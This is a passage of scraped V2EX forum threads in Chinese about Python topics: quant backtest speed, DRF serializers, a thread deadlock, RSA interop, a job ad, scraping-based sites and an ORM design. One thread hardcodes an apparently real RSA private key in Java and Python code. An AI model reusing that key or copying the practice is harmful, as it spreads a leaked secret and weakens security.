ma30=factor_output(\"sma30\",context.s1,\"m1\")[\"sma30\"]\n    if ma12&gt;ma30:\n        order(stock,1000)\n    elif ma12 &lt; ma30 and context.portfolio.positions[stock].amount &gt; 0:\n        order_target_value(stock,0)\n</code></pre>\n<p>下面是 joinquant 的代码，耗时 6 分钟</p>\n<pre><code># 初始化函数，设定要操作的股票、基准等等\ndef initialize(context):\n    # 定义一个全局变量, 保存要操作的股票\n    # 000001(股票:平安银行)\n    g.security = '000001.XSHE'\n    # 设定沪深 300 作为基准\n    set_benchmark('000300.XSHG')\n \n# 每个单位时间(如果按天回测,则每天调用一次,如果按分钟,则每分钟调用一次)调用一次\ndef handle_data(context, data):\n    security = g.security\n    close_data = attribute_history(security, 10, '1m', ['close'],df=False)\n    ma5 = close_data['close'][-5:].mean()\n    ma10 = close_data['close'].mean()\n    cash = context.portfolio.cash\n \n    if ma5 &gt; ma10:\n        order_value(security, cash)\n        log.info(\"Buying %s\" % (security))\n \n    elif ma5 &lt; ma10 and context.portfolio.positions[security].closeable_amount&gt; 0:\n        order_target(security, 0)\n        log.info(\"Selling %s\" % (security))\n \n    # 绘制五日均线价格\n    record(ma5=ma5)\n    # 绘制十日均线价格\n    record(ma10=ma10)\n</code></pre>\n<p>下面是 ricequant 的代码，耗时 3 到 4 分钟，貌似比 joinquant 的快，也有可能是因为这个例程的买入条件比较多？但是明显 ricequant 的回测准备时间较长。</p>\n<pre><code>import talib \n# 在这个方法中编写任何的初始化逻辑。 context 对象将会在你的算法策略的任何方法之间做传递。\ndef init(context):\n    context.s1 = \"000001.XSHE\"\n \n    # 设置这个策略当中会用到的参数，在策略中可以随时调用，这个策略使用长短均线，我们在这里设定长线和短线的区间，在调试寻找最佳区间的时候只需要在这里进行数值改动\n    context.SHORTPERIOD = 20\n    context.LONGPERIOD = 120\n# 你选择的证券的数据更新将会触发此段逻辑，例如日或分钟历史数据切片或者是实时数据切片更新\ndef handle_bar(context, bar_dict):\n    prices = history(context.LONGPERIOD+1, '1m', 'close')[context.s1].values \n    short_avg = talib.SMA(prices, context.SHORTPERIOD)\n    long_avg = talib.SMA(prices, context.LONGPERIOD) \n    plot(\"short avg\", short_avg[-1])\n    plot(\"long avg\", long_avg[-1])\n    cur_position = context.portfolio.positions[context.s1].quantity\n    # 计算现在 portfolio 中的现金可以购买多少股票\n    shares = context.portfolio.cash/bar_dict[context.s1].close \n    # 如果短均线从上往下跌破长均线，也就是在目前的 bar 短线平均值低于长线平均值，而上一个 bar 的短线平均值高于长线平均值\n    if short_avg[-1] - long_avg[-1] &lt; 0 and short_avg[-2] - long_avg[-2] &gt; 0 and cur_position &gt; 0:\n        # 进行清仓\n        order_target_value(context.s1, 0) \n    # 如果短均线从下往上突破长均线，为入场信号\n    if short_avg[-1] - long_avg[-1] &gt; 0 and short_avg[-2] - long_avg[-2] &lt; 0:\n        # 满仓入股\n        order_shares(context.s1, shares)\n</code></pre>\n<h1>[日线级别] 回测速度比较</h1>\n<p>日线级别上，策略 A 回测时间对比表格(镭矿需要手动修改函数名 every_minute 为 every_day)\n回测时间\n镭矿 \t秒回（少于一秒）\nricequant \t5 秒后秒回。(感觉任何回测都需要准备 5 秒钟)\njoinquant \t秒回(少于一秒）</p>\n<p>对比不明显，我们来升级一下策略逻辑。为了简便，我们仍然修改策略 A ，形成策略 B 。</p>\n<p>事实上这不是一个真正的策略，不产生任何交易。只不过我们这里为了尽快知道各个平台的回测速度罢了。</p>\n<pre><code>策略 B\n每日轮询 50 只股票的 SMA 长短线， record 出符合 SMA 短线上穿长线的股票个数\n</code></pre>\n<p><a href=\"http://www.raquant.com/?pk_campaign=v2ex\" rel=\"nofollow\">镭矿 raquant</a>的代码</p>\n<pre><code>def init(context):\n    context.stocks=find_by_group('sz50')\n    sma12_factor=SMAFactor(12,\"close\")\n    sma30_factor=SMAFactor(30,\"close\")\n    reg_factor(\"sma12\",sma12_factor)\n    reg_factor(\"sma30\",sma30_factor)\ndef every_day(context,data):\n    cnt=0\n    for stock in context.stocks:\n        ma12=factor_output(\"sma12\",stock)[\"sma12\"]\n        ma30=factor_output(\"sma30\",stock)[\"sma30\"]\n        if ma12&gt;ma30:\n            cnt=cnt+1\n    record(\"cnt\",cnt)\n</code></pre>\n<p>ricequant 代码</p>\n<pre><code>import talib\n# 在这个方法中编写任何的初始化逻辑。 context 对象将会在你的算法策略的任何方法之间做传递。\ndef init(context):\n    context.stocks =concept('央企 50')\n    context.SHORTPERIOD = 20\n    context.LONGPERIOD = 120\ndef handle_bar(context, bar_dict):    \n    cnt=0\n    for stock in context.stocks:\n        prices = history(context.LONGPERIOD+1, '1d', 'close')[stock].values\n        short_avg = talib.SMA(prices, context.SHORTPERIOD)\n        long_avg = talib.SMA(prices, context.LONGPERIOD) \n        if short_avg[-1] - long_avg[-1] &lt; 0 and short_avg[-2] - long_avg[-2] &gt; 0:\n            cnt=cnt+1\n    plot(\"cnt\",cnt)\n</code></pre>\n<p>joinquant 的代码：</p>\n<pre><code># 初始化函数，设定要操作的股票、基准等等\ndef initialize(context):\n    # 定义一个全局变量, 保存要操作的股票\n    # 000001(股票:平安银行)\n    g.stocks =get_concept_stocks('GN177')\n    set_benchmark('000300.XSHG')\n \n# 每个单位时间(如果按天回测,则每天调用一次,如果按分钟,则每分钟调用一次)调用一次\ndef handle_data(context, data):\n    cnt=0\n    # 获取股票的收盘价\n    for stock in g.stocks:\n        close_data = attribute_history(stock, 10, '1d', ['close'],df=False)\n    # 取得过去五天的平均价格\n        ma5 = close_data['close'][-5:].mean()\n    # 取得过去 10 天的平均价格\n        ma10 = close_data['close'].mean()\n    # 取得当前的现金\n        if ma5&gt;ma10:\n            cnt=cnt+1\n    record(cnt=cnt)\n</code></pre>\n<p>你们一定很好奇这次得对比结果，所以小编故意卖关子放到了最后</p>\n<p>日线级别上，策略 B 回测时间对比表格</p>\n<ul>\n<li><a href=\"http://www.raquant.com/?pk_campaign=v2ex\" rel=\"nofollow\">镭矿 raquant</a> \t  <strong>0.92 秒</strong></li>\n<li>ricequant\t<strong>9 秒左右</strong></li>\n<li>joinquant\t<strong>6 秒左右</strong></li>\n</ul>\n</div></div>"], "reply": "目前尚无回", "tittle": "主流 Python 量化回测平台,回测速度客观评测", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>假设我有两个 Serializer 在一个文件里</p>\n<pre><code>class A_Serializer():\n    b = B_Serializer()\n\nclass B_Serializer():\n    a = A_Serializer()\n</code></pre>\n<p>我想把这两个 serializer 都可以嵌套的形式获取关联的属性，\n但这样上方的 A 就会报 B_Serializer not define 问题，各位 dalao 有什么好办法吗</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>class A_Serializer():\n    #b = B_Serializer()\n    @property\n    def b():\n        return B_Serializer()\n\nclass B_Serializer():\n    a = A_Serializer()\n</code></pre>\n<p>这样好像也是不管用的</p>\n</div></div>"], "reply": "13", "tittle": "问一个比较蠢的问题，但一直没有想到好的办法 django rest framework", "comment": ["同问。", "用 @", "\r", "B_Serializer()是在定义 A_Serializer 时执行的， B_Serializer 还没定义，当然会 not define 。\r", "改成 @", " ，等待运行时获取，再缓存一下就好啦～～", "是我的话会考在 __init__ 里动态地添加 self.fields", " 我试了，但好像并不起作用 2333\r", "  self.fields 是可以修改 fields 段，但好像并不能解决引用问题，在前面定义的类怎么才能引用后面定义的类呢？", "```python\r", "class A_Serializer():\r", "    #b = B_Serializer()\r", "    @", "\r", "    def b(self):\r", "        if not hasattr(self, '_b'):\r", "            self._b = B_Serializer()\r", "        return self._b\r", "\r", "\r", "class B_Serializer():\r", "    a = A_Serializer()\r", "```\r", "应该这么写哈～～没有 self 怎么搞～～手动苦笑～～", " 我实际上是加了 self 的，虽然没报错，但是实际上没有起作用， b 被默认设置为 PrimaryKeyRelatedField 了", "这不就形成环了么，另外 not defined 应该是 python 会顺序执行代码，在 A_serializer 里面调用了 B_serializer ，但是这个时候 B_serializer 还没定义，所以就报错了", " 这么一说我才明白了，果然这样就成环了，哈哈， 23333", "不要这么初始化，循环引用了，如果是 C++ 的话，可以用指针。\r", "\r", "一个解决方案是：依赖注入:\r", "\r", "class A_Serializer():\r", "    def __init__(self):\r", "        self.b = None\r", "\r", "    def push_ass(self, b):\r", "        b = b\r", "\r", "class B_Serializer():\r", "    def __init__(self):\r", "        self.a = None\r", "\r", "    def push_ass(self, a):\r", "        self.a = a\r", "\r", "\r", "if __name__ == '__main__':\r", "    a = A_Serializer()\r", "    b = B_Serializer()\r", "    a.push_ass(b)\r", "    b.push_ass(a)", " 对啊，一开始我也没意识到循环引用的问题，但是写 restframework 好像不能控制的这么精细，现在我又写了一个基本类放在 A 前面就好了，虽然看起来有点不爽，还好我没有强迫证", "def xxx():\r", "    return B_Serializer()\r", "\r", "    @", "\r", "    def b():\r", "        return xxx()\r", "\r", "这样呢", "DRF 用了 metaclass 来构造序列器, 楼上这些解决方法等搞定楼主的期望的时候早就迟了\r", "话说楼主为什么会有这么诡异的需求.......\r", "没必要严格遵循 REST 那套东西的,死套只会越来越复杂,搞成这样一定是哪里的设计出问题了", " \r", "这个需求还行啊，感觉并不诡异 2333\r", "比如说一个 blog 关联了 comment ，我就想在 blog_detail 里嵌套返回 comment 内容\r", "而对一个 comment ，我也想嵌套返回所属的 blog 的基本信息\r", "当然这个例子不大恰当~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>场景是这样的：开启多个线程访问外部 api ，过一段时间，发现所有线程死锁。\n环境： python2.6.7 centos7.1 urllib2 ， suse 下无此问题。\ndump 如下：</p>\n<pre><code>Thread  161  (Thread  0x7f80de4e9700  (LWP  12459)):\n#0    0x00007f80e4cacb6c  in  __lll_lock_wait_private  ()  from  /lib64/libc.so.6\n#1    0x00007f80e4cc2efd  in  _L_lock_746  ()  from  /lib64/libc.so.6\n#2    0x00007f80e4cc2cb5  in  __check_pf  ()  from  /lib64/libc.so.6\n#3    0x00007f80e4c88f69  in  getaddrinfo  ()  from  /lib64/libc.so.6\n#4    0x00007f80e12faa3c  in  socket_getaddrinfo  (self=&lt;optimized  out&gt;,  args=&lt;optimized  out&gt;)  at  /home/basic/Python-2.7.6/Modules/socketmodule.c:4198\n#5    0x00000000004b5726  in  call_function  (oparg=&lt;optimized  out&gt;,  pp_stack=0x7f80de4e6b30)  at  Python/ceval.c:4021\n#6    PyEval_EvalFrameEx  (f=f@entry=0x7f7fa403c980,  throwflag=throwflag@entry=0)  at  Python/ceval.c:2666\n\n</code></pre>\n<p>看上去是 getaddrinfo 引发的死锁，不知道大家没有遇到这个坑，请大家帮忙给些建议，谢谢！</p>\n</div></div>"], "reply": "2", "tittle": "Python 多线程死锁", "comment": ["看不懂- -，不过 OS 课本上说的是按照统一的顺序调用临界资源即可"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Java 代码</p>\n<pre><code>public static String encrypt(String paramString)throws Exception\n{\n    return Base64Utils.encode(RSAUtils.encryptByPrivateKey(paramString.getBytes(), \"MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAIrrUGxh+yvNNI1c9hUg1rH+EtipI0nPk3zRm2Cj4mLDWLJ6DaTzdJTXTF3BYZaancWeG3QtBL+fITUi72InwBP7zaNG8uv/guwuhWT6V/YO7AaTrOFeTkg9NXuaFbn3hWVtZxQm2tIlaVa8snoNj3VGnPqIjXmGcxk4axuYd7sTAgMBAAECgYA43YhnRVh2nqJzd2k4Tt/zrmhyjhHm5fSetIKg9ZT3DrXhITsymYHQZ61X95AGATayLT1Zug/mjLIgOTO6f0ENkRQtjVCmKd8Yf/BeDEc5kRLUYDfSqoEydHK0+rCw5tJMgrAnQc5lHc+FVdGe2bOxKTEtZoss9VQ2jYuQ+Z5fUQJBANnvDOcI2OYSksX3PpHzO9F272xkmqYBRGkMc/a5RuOv1CY6FqMIkkloTf6nVl9y6XYV8gnHfbbI/wj4Q4UnPYsCQQCjLxyRYaOeEb/qOzSmFXytgMuCM9sr4eY9jpjzDgNWhpbtaVaf1QvSTXqN0zaUu4Se2tmWGX7zXw9p/dFf8DmZAkEAzl1o0FU2XhZ0WXVYEIhMunpvGSrirhNBHmAmZxjmoa/bqh8TVGpHa6+TO3JlfZioraL2QIBg8Ha/2VSNS0bvJQJALfCLaFpGh6+TicuVLNSLvwStRkB3CUmVWesVIAfn5KoLP1cSbfi6VUA+qkK18PVBhr8x1lHjLXyriDlOgmXMsQJAW9vD/IoBs4QJF87xF7tZvu/b1KRVgLM1edqOgVwMNbIQHBAXghjVjrpuln5w6z1dJ2cEjRP98OxKC0hqEIwIuQ==\");\n}\nencrypt('159742081') --&gt; GBn6RGIeEp8j/n35CgT5DdMmrvvNBtVCFQikO0vfJaYYrpEzBZ/F+5PkFLpzLDtYvQrj0Q/x/Fdxz3BtbEdLq57WFxB5MvkFxerWVeplA2vdlD7m+dgjsWyxBSbcVV1QX3UBNp+T3DtxL6uGuWUNxucy9yB5TOD3xCNchzGCnSU=\n</code></pre>\n<p>Python 代码</p>\n<pre><code>from Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_v1_5, PKCS1_OAEP\nfrom base64 import b64decode, b64encode\n\n\nkey = 'MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAIrrUGxh+yvNNI1c9hUg1rH+EtipI0nPk3zRm2Cj4mLDWLJ6DaTzdJTXTF3BYZaancWeG3QtBL+fITUi72InwBP7zaNG8uv/guwuhWT6V/YO7AaTrOFeTkg9NXuaFbn3hWVtZxQm2tIlaVa8snoNj3VGnPqIjXmGcxk4axuYd7sTAgMBAAECgYA43YhnRVh2nqJzd2k4Tt/zrmhyjhHm5fSetIKg9ZT3DrXhITsymYHQZ61X95AGATayLT1Zug/mjLIgOTO6f0ENkRQtjVCmKd8Yf/BeDEc5kRLUYDfSqoEydHK0+rCw5tJMgrAnQc5lHc+FVdGe2bOxKTEtZoss9VQ2jYuQ+Z5fUQJBANnvDOcI2OYSksX3PpHzO9F272xkmqYBRGkMc/a5RuOv1CY6FqMIkkloTf6nVl9y6XYV8gnHfbbI/wj4Q4UnPYsCQQCjLxyRYaOeEb/qOzSmFXytgMuCM9sr4eY9jpjzDgNWhpbtaVaf1QvSTXqN0zaUu4Se2tmWGX7zXw9p/dFf8DmZAkEAzl1o0FU2XhZ0WXVYEIhMunpvGSrirhNBHmAmZxjmoa/bqh8TVGpHa6+TO3JlfZioraL2QIBg8Ha/2VSNS0bvJQJALfCLaFpGh6+TicuVLNSLvwStRkB3CUmVWesVIAfn5KoLP1cSbfi6VUA+qkK18PVBhr8x1lHjLXyriDlOgmXMsQJAW9vD/IoBs4QJF87xF7tZvu/b1KRVgLM1edqOgVwMNbIQHBAXghjVjrpuln5w6z1dJ2cEjRP98OxKC0hqEIwIuQ=='\n\nrsakey = RSA.importKey(b64decode(key))\ncipher = PKCS1_OAEP.new(rsakey)\nb = cipher.encrypt(b'159742081')\nprint(b64encode(b))\n\ncipher = PKCS1_v1_5.new(rsakey)\nb = cipher.encrypt(b'159742081')\nprint(b64encode(b))\n</code></pre>\n<p>输出：\nb'ZkSAKcf9aGbRaOUaywZEQKIS4jdYpn+dlSxwpRFlmwjcNmVM7Cp0GQzz9yY2g7UdPVJCubRuPbKmyale2cuAqsVu+Y1n79EMoxSbShys0/o1o8V4UCuV+jP3e3EnyT86yoTyTDMXQzgDS+SRSkEF9U6db19T12/xEtfcKRcHing='</p>\n<p>b'YQz8gjcslQ8QsYs9eU+Yu2owf55gHVedIksovrMczCRSaQ8vhml1ua6bAmf6xvg7zlw5BGZ7KlTygIgqKDvf6JgdZh5k2OoiK8uGYCFFCJFY0+3ZjhytG4KfwujqbCQWu3rZSaFZeF76MdFBQUWzJ2Q3V1BFTljF3Euu7X5KPpk='</p>\n<p>各位老爷给看看，是哪里姿势不对</p>\n</div></div>"], "reply": "9", "tittle": "Python 调用 Java 生成的 RSA 私钥加密结果不一样", "comment": ["这是特性…… random padding\r", "为什么 java 里边不对 privatekey 的 b64 表示解码， python 不都先 decode 了么", " encryptByPrivateKey 这个方法里面会对 primarykey 进行 base64 解码", " 英文实在太弱了，老哥能再提示多一点吗？", "看这个不错 ", " 老哥稳，读了后面那篇已经明白为什么了，下一步就看怎么解决了，灰常感谢！！", "不需要关注是否一致，只需要关注能否互操作", " 服务器只接受 Java 加密出来的密文， python 加密的密文不接受。", " 好奇怪……"]},
{"content": ["<div class=\"topic_content\">简历请投递： <a target=\"_blank\" href=\"mailto:mayfanfan@dingtalk.com\">mayfanfan@dingtalk.com</a>\r<br>\r<br>你所需要的做的：\r<br>1 、参与需求收集与整理，负责设计系统；\r<br>2 、参与系统开发、测试；\r<br>3 、系统维护；\r<br>4 、管理后端研发部；\r<br>\r<br>我们的要求：\r<br>1 、不少于 2 年的 Python 开发经验，理解 Python 哲学；\r<br>2 、熟练掌握至少一种 Python Web 框架，并有实际经验， Django 或 Flask 优先；\r<br>3 、主导过 Web 项目的设计和开发，有良好的编程理念和项目架构设计经验；\r<br>4 、熟悉 Memcache 或者 Redis ，且有实战经验；\r<br>5 、熟悉 Postgresql/MySQL/Sqlite ，掌握常用的 SQL 优化技能；\r<br>6 、了解 Linux ，知道 wsgi ，熟悉 wsgi 项目的部署;\r<br>7 、自我驱动的学习和工作习惯，对未知技术和领域能快速掌握并实践；\r<br>8 、掌握至少 1 种压力测试的方法，且有实际操作经验；\r<br>9 、有线上项目可以演示。\r<br>\r<br> [加分项] \r<br>1 、有分布式系统的开发经验；\r<br>2 、有敏捷开发的经验，熟悉 Redmine/Gitlab/Trac/Git/Hg 等工具；\r<br>3 、熟悉前端开发技术；\r<br>4 、参加过著名的 Web 产品 /项目研发；\r<br>5 、有自己的技术博客。\r<br>\r<br> \r<br>\r<br>说了辣么多\r<br>\r<br>我们来点实际的吧\r<br>\r<br>也是你们所关心的——福利\r<br>\r<br>福利在这呢：\r<br>\r<br>1.薪资： 10K~18K\r<br>\r<br>2.你不仅仅只是一个普通的工程师，你的未来：\r<br>\r<br> 发展途径：（专业岗）高级——资深——专家\r<br>\r<br>        （管理岗）团队组长——经理——总监\r<br>\r<br> 甚至是......转岗（在银刃无所不奇）只要你能，你可以！\r<br>\r<br>每半年的一次岗位晋升申请调整，还有什么公司可以这么任性？\r<br>\r<br>3.办公环境文艺优雅舒适，全是 90 后的小鲜肉，帅气老板 Nice,公司氛围好；\r<br>\r<br>4.生日=生日歌+生日红包+月生日会，结婚礼金，生育礼金；\r<br>\r<br>5.厨艺堪比星级酒店的阿姨，为我们献上营养丰富的中餐+晚餐；\r<br>\r<br>6.距家较远也不用担心，还有温馨的员工宿舍提供呢；\r<br>\r<br>7.未完待遇，不断开发 ing...</div>"], "reply": "3", "tittle": "高级 Python 工程师招聘（包食宿+工作环境优美+期权）", "comment": ["高级？两年？ 10-18k ？", "是的哦。有意向吗？有兴趣可将简历投至邮箱哦。", " 是的哦。有意向吗？有兴趣可将简历投至邮箱哦。"]},
{"content": "", "reply": "2", "tittle": "Python 的哪一个框架可以做一个类似于在线编辑器，类似于 pdf 的样式", "comment": ["在线编辑器不是该区 JS 版块问吗？", "python 哪个框架都不行， python 哪个框架都行"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在腾讯云 vps 上用Ｄ jango 架了一个直播号航网站： <a href=\"http://www.yibo666.cn/\" rel=\"nofollow\">http://www.yibo666.cn/</a>,\n每一分钟更新主播状态，由于数据不是很多，界面空洞，怎么样才能让界面看着舒服点，然后有什么建议。还有抓取了几千个主播每天的微博更新，也不知道界面怎么弄。各位大神有何良策？</p>\n</div></div>"], "reply": "19", "tittle": "做了一个直播导航网站，数据不是很多，界面太丑，求建议", "comment": ["很厉害哎！数据都有了，可以做个排行榜什么的（好像有人做过。。。）", "可以参考斗鱼的 UI ，弄些 icon ，文字排版下。数据还蛮多的，那个直播时间图挺赞的，做一些数据分析还是不错的。", "稍稍改了下 ", "  滚动条放左边好像不适合普通人的习惯吧？热门主播，新人主播，这个我没数据。。。。我的审美觉得还是有点阴暗的界面。。", "太厉害了!", " 可以的", "厉害啊....怎么做的能参考代码吗?", "图片宽高比调整一下。每个直播间的信息精简一下，不用弄成上下都有，或者把一部分信息写在图片里。字体调小。\r", "\r", "其实可以参照下斗鱼之类的。", "人气值三个字做个 icon ，然后把人气值转换成 xx 万之类的。左边的导航栏背景做个毛玻璃效果感觉会好很多。", "数据采集，其实很简单，分析一下 html 代码，主要是数据绑定规律，解析一下数据就是你的了，一个简单的逆向过程", " 能问下数据都是怎么获取的么? 比如在线状态, 观看数量这些, 都是抓 html 取的?", " 您好，我是用爬虫去抓取每斗鱼，熊猫，战旗等网站的直播页面，每一分钟抓取一次，所以我更新会落后这些网站一分钟左右。我是根据他们的状态判断主播状态的。。", " 您好，我没那实力去完全照搬斗鱼，熊猫这些网站的界面，原因有这些。\r", "（ 1 ）我的数据没有他们多，只有主播人气，状态数据而已。\r", "（ 2 ）我切图水平有限，他们图片太多，我就算 css,html 跟他们一样，少了图片，就差距很大。\r", "（ 3 ）我是个后端程序员，欣赏，设计能力有限，不能举一反三。\r", "我现在就是想弄成谷歌那种，界面简单，但是不难看的界面。", " 可能由于我是近视眼的原因，我看小的字很难受，所以就把字体变大了。气值转换成 xx 万之类这个可以做。", " 自己做着玩也无所谓了，不过字体小一点真的挺重要的，我也是正式接触项目的时候才发现的。", "每次做东西的时候 最头疼的就是界面 总想设计得很好看\r", "\r", "于是乎 我想找个做设计的女朋友 😁😈 ", "   ", "   ", " ", "我可以做，但是要钱哈哈哈", "的确，自己撸网站最难的就是想需求和设计\r", "\r", "就是用最熟知的 bootstrap 做 UI 都比你自己写要好看嘛，大概看了下除了 pagination 都是自己写的样式\r", "\r", "第一可以用一些现成的 UI 框架，比如谷歌 design 、 bulma 之类的\r", "第二可以去一些卖皮肤的网站“借鉴”一下那些大手子的设计", "  是的，很多样式都是自己写的， bootstrap 的感觉不好看。。以前没用过谷歌 design 、 bulma 之类的。有时间去研究一下。谢谢！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在为学校图书馆写一个基于命令行的监控脚本，准备用 click 来实现交互。但是现在遇到一个问题，就是 @option 的个数太多，就像下面这样：</p>\n<pre><code>import click\n\n@click.command()\n@click.option('-a')\n@click.option('-b')\n@click.option('-c')\n@click.option('-d')\n...\n@click.option('-z')\ndef myscript(a, b, c, ..., z):\n    if a:\n        ...\n\n    if b:\n        ...\n\n    ...\n    \n    if z:\n        ...\n</code></pre>\n<p>由于 @option 太多，必须要在<code>myscript</code>下面用大量的 if 语句一一检查用户是否给出了某个选项，这样的话代码结构太丑了，请问对这样的情况有什么好的解决方法？</p>\n</div></div>"], "reply": "3", "tittle": "如何优雅解决 click 模块 @option 的选项太多？", "comment": ["最近有个 python-fire 很火 可以看看 \r", "\r", "至少不用写这么多 if", "pocoo 喜欢滥用 @，实在是丑啊。", "没用过 click ，不过 decorator 太多是可以抛弃语法糖，直接用循环解决：\r", "def myscript(self, ...):\r", "    pass\r", "\r", "for option in reversed(['-a', '-b', ..., '-z']):\r", "  myscript = click.option(option)(myscript)\r", "\r", "myscript = click.command()(myscript)"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>xorm</h1>\n<p><a href=\"https://github.com/gaojiuli/xorm\" rel=\"nofollow\">xorm</a></p>\n<p>ORM for the zen of python.</p>\n<p>相信大家能通过下面的代码明白我的意思.</p>\n<h2>model</h2>\n<pre><code>from xorm import Model\nfrom xorm.fields import *\n\nclass User(Model):\n  name = Char()\n  age = Int()\n  is_adult = Bool()\n  groups = ManyToMany(Group,related_name=\"users\")\n\nclass Group(Model):\n  name = Char()\n  created_at = DateTime()\n</code></pre>\n<h2>migrate</h2>\n<ol>\n<li>xorm makemigrations</li>\n<li>xorm migrate</li>\n<li>xorm rollback</li>\n</ol>\n<h2>query</h2>\n<pre><code>from .models import User\nfrom xorm import sql\n\nUser.list(age_lt = 18, groups__name = \"doit\").fields(['name', 'age', {'groups': ['name']}])\n\nUser.retrive(id=1).fields(['name', 'age'])\n\nUser.replace(id=1).data({'name':'test1'})\n\nUser.update(id=1).data({'age': 18})\n\nUser.create(data={})\n\nUser.delete(id=1)a\n\nxorm.sql('SELECT * FROM users')\n\n</code></pre>\n<p>github 项目地址：<a href=\"https://github.com/gaojiuli/xorm\" rel=\"nofollow\">https://github.com/gaojiuli/xorm</a></p>\n<p>我还没有开始写，大家帮忙提提意见</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>方案一直在优化\n方案当前情况请查看README: <a href=\"https://github.com/gaojiuli/xorm\" rel=\"nofollow\">https://github.com/gaojiuli/xorm</a></p>\n</div></div>"], "reply": "43", "tittle": "xorm 立项，你心目中 ORM 系统是什么样的(极简风格，极少代码)", "comment": ["用法感觉和 sqlalchemy 差不多啊", " orm 思想都是差不多的， 我的目标是将 api 缩减为常用的几个， 数据表的建立和数据库的迁移傻瓜化， 查询语句直接生成字典， 而不用自己 serializer", "golang 有个 orm 也叫这儿", "讲道理的话，我觉得 ORM 接口做得做好的就是类似 linq 那种，也就是像 PonyORM 或者 macropy 那种。不过他们好像都是 ActiveRecord ， SQLAlchemy 是 DataMapper 来的，因此有些人会觉得 SQLAlchemy 比起其他 ORM 难用，关键就是在这里。", "Django orm", "所以这个是给 xweb 用的😂", "你这一点都不 zen of python", " +1", "极简风格，极少代码, 那么已经有 peewee 了.\r", "\r", "另同意 @", ", 的确不 zen of python", " 我比较喜欢 datamapper", " 可以给点意见么", " peewee 冗余功能挺多，我主要是针对 restful 接口设计这个 orm", " 虽然是这意思，但是没有耦合！", " 这个没关系，改名字还是挺容易的", "linq2sql", "ActiveRecord !", "ActiveRecord +1", "如果能支持 2.7 的异步，我就用它", " 可以详细说一下么", "我现在急需一个混合 backend  的 ORM\r", "\r", "比如一个 User 对象， name 是保存在 mysql 里的， login_cnt 登陆次数，保存在 redis 。\r", "\r", "惰性求值，结果缓存，能交叉查询等等。\r", "\r", "能做出来就厉害了。极大简化 controller 里的面条粗细程度。", " 好主意, 我决定加入这样的功能,请关注我的 README", " 看你的代码不像啊，你写的都是 ActiveRecord 吧， ActiveRecord 是将操作跟数据库领域模型绑定在一起，比如 User 类有 insert 之类的操作，这样就是 ActiveRecord 。\r", "至于 DataMapper 是只能通过一个 proxy 来进行数据库操作，举例子就是 SQLAlchemy 中的 session 对象， SQLAlchemy 里面的 Model 是没有操作数据库的能力", "  感谢你的回复, 可能是我搞混了 ActiveRecord 和 DataMapper. 我说一下我的思路,:\r", "\r", "1. 模仿 Django ORM 定义 Model, 以及实现它的 makemigrations 功能, 方便迁移.\r", "2. 将 Model 的方法定义在有限的几个操作中 list,retrieve,create,destroy,replace,update.这几个方法生成对应的 Query, Query 生成对应的 sql, Model 同时可以自定义自己方法, 实现类似 def change_status()这样的方法,方法里进行逻辑处理, 而不把逻辑放到 controller 中.\r", "3. 返回的数据为字典对象\r", "\r", "你看看有什么建议", "我看了标题就在想 这不是 golang 的 orm 么～～  最喜欢的 orm [sequelize] ", "为啥我用 golang 的 xorm  数据库 datetime 是 null 的话  返回的字符串是 0001-01-01 07:06:20", " 这不是 golang 那个", "很久前写的 mongo 的 ORM 后来换工作什么的就再没维护了 orz  不知道楼主觉得我这样的 api 设计的如何 ", " 挺好的啊, 怎么不维护下去呢", " 差不多， ActiveRecord 都差不多是这个思路。没问题，不过你返回的是字典对象的话，那么不就代表我想扩展一下 Model 子类都不行了吗？那样很残废啊。\r", "\r", "我第一个回复上面举的例子是不错的参考，结合 Python 的自身生成器，迭代器，列表推导。不过 API 这回事大多数品味而已。我比较关注是你如何处理比较复杂的 join 操作，毕竟很多 ActiveRecord 的 API 不太好处理各类 join 的操作。这是我在使用时的体会。\r", "虽然说很多人说 join 不好，但是平常大家体量没上去的时候肯定整天会用各类 join ，希望能考虑一下", " 因为换工作了之后比较忙（技术栈转成了 java  得从头学） 后来发现 pymongo 都到 3.x 了 然后在搞其他的东西就搁置了", " 谢谢你的建议, 我会好好考虑你的意见, 有进展会通知你", "你指 ORM 本身的代码尽量少，还是用 ORM 的人可以尽量少写代码呢？\r", "\r", "要不学学 Ruby 的 ActiveRecord ，从数据库自己获取 Schema 吧。", " 用的人少写代码, 本身代码也少", "看 LZ 是有真想做些事情的热情，那建议用心研究下 Ruby 的 ActiveRecord ，如果能在 python 推出个稳定可靠的版本绝对是造福众人", " 这两者基本是互相矛盾的", " 我会大量参考 rails orm 以及 django orm", "  尽量吧", "import peewee as xorm", "我心目中的  ORM 不是 ORM 是  DSL", " 很完美， 要是有 migration 功能就好了", "支持 mssql 就可以了", " 有的: ", "\r", "\r", "另，“针对 restful 接口设计这个 orm ”， 这句真没看懂", " orm 的动作直接和 http 请求映射起来"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>分析百度贴吧的网页规律, 请求如:<a href=\"http://tieba.baidu.com/f?kw=%E4%B8%AD%E8%80%83&amp;pn=\" rel=\"nofollow\">http://tieba.baidu.com/f?kw=%E4%B8%AD%E8%80%83&amp;pn=</a>{}.format(187450)类似的网页</p>\n<p>在浏览器中打开没有需要验证码，为什么爬取的时候需要验证码呢？</p>\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"zh-cn\"&gt;\n\n&lt;head&gt;\n  &lt;meta charset=\"utf-8\"&gt;\n  &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt;\n  &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;  &lt;meta name=\"format-detection\" content=\"telephone=no\"&gt;\n  &lt;title&gt;验证码&lt;/title&gt;\n\n    &lt;link 